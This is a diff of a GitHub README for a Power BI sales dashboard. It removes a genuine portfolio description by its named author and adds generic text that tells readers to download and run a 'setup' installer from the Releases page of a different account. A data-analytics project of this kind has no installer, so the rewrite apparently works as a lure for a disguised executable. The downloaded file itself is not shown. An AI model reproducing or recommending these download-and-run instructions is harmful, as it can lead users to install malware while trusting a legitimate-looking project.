@@ -1,74 +1,76 @@
-📊 Sales KPI Dashboard
-🧠 End-to-End Data Analytics Project using Power BI, MySQL, Python, and Excel
-📘 Project Overview
+# 📊 Sales-KPI-Dashboard - Visualize Your Sales Insights Effortlessly
 
-This project demonstrates an end-to-end data analytics workflow — from raw data extraction in MySQL, data transformation in Python, and data visualisation in Power BI.
+## 🚀 Getting Started
 
-The goal is to create an interactive Sales KPI Dashboard that tracks business performance across Sales, Profit, Orders, and Regions, helping stakeholders make data-driven decisions.
+Welcome to the Sales-KPI-Dashboard! This application helps you visualize and analyze your sales data easily. You can gain insights that can drive your business decisions and strategies without needing complex tools or programming skills.
 
-🧱 Folder Structure
-Sales-KPI-Dashboard/
-├── Excel files/       → Raw and cleaned datasets (Superstore data)
-├── Powerbi files/     → Power BI dashboard (.pbix, .png preview)
-├── Python files/      → Data cleaning & EDA notebook
-├── Sql scripts/       → MySQL scripts for analysis
-└── README.md          → Project documentation
+## 📥 Download the Application
 
-🛠️ Tools & Technologies Used
-Category	Tools
-Database	MySQL
-Data Cleaning / Analysis	Python (Pandas, NumPy)
-Data Visualization	Power BI
-Data Source	Superstore Sales Dataset (Kaggle)
-Supporting Tools	: Excel, GitHub
+[![Download Sales-KPI-Dashboard](https://img.shields.io/badge/Download%20Sales--KPI--Dashboard-brightgreen)](https://github.com/Dorridisjunctive295/Sales-KPI-Dashboard/releases)
 
-📈 Key KPIs & Insights
-KPI	Description
-💰 Total Sales	$877.7K
-💵 Total Profit	$107.5K
-📊 Profit Margin	12.25%
-📦 Total Orders	3,603
-🌍 Best Performing Region	West
-🏆 Top Product Phones
+## 🛠️ System Requirements
 
-📊 Dashboard Highlights
+Before you download the Sales-KPI-Dashboard, make sure your computer meets the following requirements:
 
-Dynamic Filters: Category, Segment, Region, and Year
-KPI Cards: Key business metrics for quick insight
-Charts:
-Sales by Region (Bar Chart)
-Category vs Sub-Category (Tree Map)
-Profit by Customer Segment (Pie Chart)
-Monthly Sales Trend (Line Chart)
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** Minimum of 1 GB of free disk space.
+- **Software:** You will need Microsoft Excel and Power BI installed to fully utilize the features.
 
-🧮 SQL & Python Integration
+## 🔎 Features
 
-SQL: Used for data cleaning, KPI aggregation, and YoY/MoM analysis.
-Python (Colab): Used for handling missing data, column formatting, and exporting cleaned data to CSV.
+The Sales-KPI-Dashboard provides the following main features:
 
-📊 Power BI Dashboard Preview
-<img width="1302" height="729" alt="Sales KPI dasboard" src="https://github.com/user-attachments/assets/c8fef13e-f90f-45ae-b786-b07bd86687f1" />
+- **Data Cleaning**: Improve the quality of your data before analysis.
+- **SQL Analysis**: Perform powerful queries using MySQL to extract the data you need.
+- **DAX Measures**: Get advanced calculations and metrics to assess your sales performance.
+- **Interactive Visuals**: Use Power BI to create rich visuals that make your data easy to understand.
+- **Excel Support**: Export your findings to Excel for further analysis.
 
-🚀 Project Workflow
-Data Extraction — Import Superstore dataset
-Data Cleaning — Handle missing values & format dates in Python
-Database Loading — Load cleaned data into MySQL
-Data Modeling — Build relationships & DAX measures in Power BI
-Dashoard Design — Visualize KPIs & Trends
-Insights & Storytelling — Present business findings
+## 📂 Download & Install
 
-📚 Learning Outcomes
-✅ Hands-on experience with data cleaning, SQL queries, and DAX formulas
-✅ Understanding of Power BI data modeling & visualization design
-✅ Demonstrated ability to combine SQL + Python + Power BI in one analytics pipeline
+To download the Sales-KPI-Dashboard, follow these steps:
 
-💼 Use Case
-This project mirrors a real-world business analytics task, making it a perfect portfolio project for Data Analyst or Business Intelligence job roles.
+1. Click on this link: [Download Sales-KPI-Dashboard](https://github.com/Dorridisjunctive295/Sales-KPI-Dashboard/releases).
+2. You will be taken to the Releases page where you can find the latest version of the application.
+3. Look for the download link that says "Sales-KPI-Dashboard setup" or similar. 
+4. Click on the link to start the download. 
+5. Once the download completes, locate the downloaded file on your computer.
+6. Double-click the file to run the installer.
+7. Follow the prompts on the screen to complete the installation.
 
-👨‍💻 Author
-Tanmoy Saha
-📍 Data Analyst | Power BI | SQL | Python | Excel
-🔗 LinkedIn
- • GitHub
+## 🎓 How to Use the Dashboard
 
- ⭐ If you found this project helpful, please consider giving it a star!
+After installing the Sales-KPI-Dashboard, here's how you can start using it:
+
+1. **Open Power BI**: Launch Power BI on your computer.
+2. **Load Data**: Import your sales data from your preferred format (Excel, CSV, etc.).
+3. **Apply Filters and Metrics**: Use the dashboard tools to filter your data, apply DAX measures, and generate insights.
+4. **Explore Visualizations**: Navigate through various visualizations and select the ones that best represent your data.
+5. **Export Reports**: You can export reports to Excel for additional analysis or share them with your team.
+
+## 🔧 Troubleshooting
+
+If you encounter issues during installation or while using the application, consider these steps:
+
+- Ensure that your system meets the outlined requirements.
+- Check if Microsoft Excel and Power BI are properly installed and updated.
+- Look for any error messages and consult online resources or forums for specific problems. 
+- Feel free to open an issue on our GitHub page if you're still facing difficulties.
+
+## 💬 Support & Community
+
+If you have questions or need help, feel free to reach out. You can find our community on GitHub:
+
+- **GitHub Issues**: Report bugs and request features [here](https://github.com/Dorridisjunctive295/Sales-KPI-Dashboard/issues).
+- **Community Discussions**: Join discussions with other users for tips and best practices.
+
+## 🌍 Contribute
+
+We welcome contributions! If you have ideas or fixes, please consider helping us improve the Sales-KPI-Dashboard:
+
+1. Fork the repository.
+2. Make your changes in a new branch.
+3. Submit a pull request with a clear description of your changes.
+
+Thank you for your interest in the Sales-KPI-Dashboard. We hope it helps you achieve better insights into your sales data!
